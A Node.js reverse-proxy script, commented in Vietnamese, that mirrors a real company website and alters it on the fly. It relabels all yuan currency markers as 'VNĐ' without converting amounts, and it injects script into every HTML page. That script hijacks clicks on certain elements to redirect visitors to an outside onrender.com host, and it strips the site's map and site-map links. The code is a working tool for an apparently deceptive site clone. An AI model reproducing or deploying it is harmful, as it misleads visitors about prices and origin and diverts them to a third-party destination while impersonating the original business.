const http = require('http');
const https = require('https');
const url = require('url');
const zlib = require('zlib');

// Cấu hình
const PORT = process.env.PORT || 3000;
const TARGET_URL = 'https://ess-ds.com'; // Thay bằng URL trang web bạn muốn proxy

// Hàm thay thế CNY thành VNĐ
function replaceCnyWithVnd(text) {
  // Thay thế tất cả các dạng CNY thành VNĐ
  return text
    .replace(/CNY/g, 'VNĐ')
    .replace(/cny/g, 'vnđ')
    .replace(/Cny/g, 'Vnđ')
    .replace(/¥/g, 'VNĐ')
    .replace(/元/g, 'VNĐ')
    .replace(/人民币/g, 'VNĐ')
    .replace(/RMB/g, 'VNĐ')
    .replace(/rmb/g, 'vnđ');
}

// Hàm để decompress response nếu cần
function decompressResponse(response, encoding) {
  return new Promise((resolve, reject) => {
    let chunks = [];
    
    response.on('data', chunk => chunks.push(chunk));
    response.on('end', () => {
      const buffer = Buffer.concat(chunks);
      
      if (encoding === 'gzip') {
        zlib.gunzip(buffer, (err, result) => {
          if (err) reject(err);
          else resolve(result.toString());
        });
      } else if (encoding === 'deflate') {
        zlib.inflate(buffer, (err, result) => {
          if (err) reject(err);
          else resolve(result.toString());
        });
      } else {
        resolve(buffer.toString());
      }
    });
    
    response.on('error', reject);
  });
}

// Tạo server
const server = http.createServer(async (req, res) => {
  try {
    console.log(`📡 ${req.method} ${req.url}`);
    
    // Parse target URL
    const targetUrl = new URL(TARGET_URL);
    const fullUrl = new URL(req.url, TARGET_URL);
    
    // Chuẩn bị request options
    const options = {
      hostname: targetUrl.hostname,
      port: targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80),
      path: fullUrl.pathname + fullUrl.search,
      method: req.method,
      headers: {
        ...req.headers,
        host: targetUrl.hostname,
        'accept-encoding': 'gzip, deflate'
      }
    };
    
    // Chọn module http hoặc https
    const httpModule = targetUrl.protocol === 'https:' ? https : http;
    
    // Tạo request tới target server
    const proxyReq = httpModule.request(options, async (proxyRes) => {
      try {
        // Sao chép headers (trừ content-length vì có thể thay đổi)
        const responseHeaders = { ...proxyRes.headers };
        delete responseHeaders['content-length'];
        delete responseHeaders['content-encoding'];
        
        // Kiểm tra content type
        const contentType = proxyRes.headers['content-type'] || '';
        const isTextContent = contentType.includes('text/') || 
                             contentType.includes('application/json') ||
                             contentType.includes('application/javascript') ||
                             contentType.includes('application/xml');
        
        if (isTextContent) {
          // Decompress và thay thế text content
          const encoding = proxyRes.headers['content-encoding'];
          const body = await decompressResponse(proxyRes, encoding);
          let replacedBody = replaceCnyWithVnd(body);

          // Nếu là HTML thì chèn thêm script để vô hiệu hóa click vào .ones
          if (contentType.includes('text/html')) {
            const disableOnesScript = `\n<script>(function() {\n  var redirectUrl = 'http://vtenergy.onrender.com/index';\n  function redirectOnes() {\n    document.querySelectorAll('.ones').forEach(function(el) {\n      el.style.pointerEvents = 'auto';\n      el.style.cursor = 'pointer';\n      el.setAttribute('tabindex', '0');\n      el.onclick = function(e) { e.preventDefault(); e.stopPropagation(); window.location.href = redirectUrl; return false; };\n      el.addEventListener('click', function(e) { e.preventDefault(); e.stopPropagation(); window.location.href = redirectUrl; return false; }, true);\n      // Gán cho tất cả phần tử con\n      el.querySelectorAll('*').forEach(function(child) {\n        child.style.pointerEvents = 'auto';\n        child.style.cursor = 'pointer';\n        child.setAttribute('tabindex', '0');\n        child.onclick = function(e) { e.preventDefault(); e.stopPropagation(); window.location.href = redirectUrl; return false; };\n        child.addEventListener('click', function(e) { e.preventDefault(); e.stopPropagation(); window.location.href = redirectUrl; return false; }, true);\n      });\n    });\n  }\n  function removeMapBox() {\n    document.querySelectorAll('.map-box').forEach(function(el) {\n      el.remove();\n    });\n  }\n  function removeSiteMapLi() {\n    document.querySelectorAll('li').forEach(function(li) {\n      var span = li.querySelector('span');\n      if (span && span.textContent.trim() === 'Site Map') {\n        li.remove();\n      }\n    });\n  }\n  document.addEventListener('DOMContentLoaded', function() {\n    redirectOnes();\n    removeMapBox();\n    removeSiteMapLi();\n  });\n  setInterval(redirectOnes, 1000);\n  setInterval(removeMapBox, 1000);\n  setInterval(removeSiteMapLi, 1000);\n})();<\/script>`;
            // Chèn trước </body>
            if (replacedBody.includes('</body>')) {
              replacedBody = replacedBody.replace(/<\/body>/i, disableOnesScript + '\n</body>');
            } else {
              replacedBody += disableOnesScript;
            }
          }

          // Set response
          res.writeHead(proxyRes.statusCode, responseHeaders);
          res.end(replacedBody);
          
          console.log(`✅ Replaced CNY → VNĐ (${replacedBody.length} chars)`);
        } else {
          // Pipe binary content trực tiếp
          res.writeHead(proxyRes.statusCode, responseHeaders);
          proxyRes.pipe(res);
          
          console.log(`📄 Piped binary content`);
        }
      } catch (error) {
        console.error('❌ Error processing response:', error);
        res.writeHead(500);
        res.end('Internal Server Error');
      }
    });
    
    // Xử lý lỗi proxy request
    proxyReq.on('error', (error) => {
      console.error('❌ Proxy request error:', error);
      res.writeHead(500);
      res.end('Proxy Error');
    });
    
    // Pipe request body nếu có
    if (req.method === 'POST' || req.method === 'PUT' || req.method === 'PATCH') {
      req.pipe(proxyReq);
    } else {
      proxyReq.end();
    }
    
  } catch (error) {
    console.error('❌ Server error:', error);
    res.writeHead(500);
    res.end('Internal Server Error');
  }
});

// Xử lý lỗi server
server.on('error', (error) => {
  console.error('❌ Server error:', error);
});

// Start server
server.listen(PORT, () => {
  console.log(`🚀 Reverse Proxy server running on http://localhost:${PORT}`);
  console.log(`📡 Proxying requests to: ${TARGET_URL}`);
  console.log(`🔄 Replacing: CNY → VNĐ, ¥ → VNĐ, 元 → VNĐ, 人民币 → VNĐ, RMB → VNĐ`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('🔄 Shutting down gracefully...');
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('🔄 Shutting down gracefully...');
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});
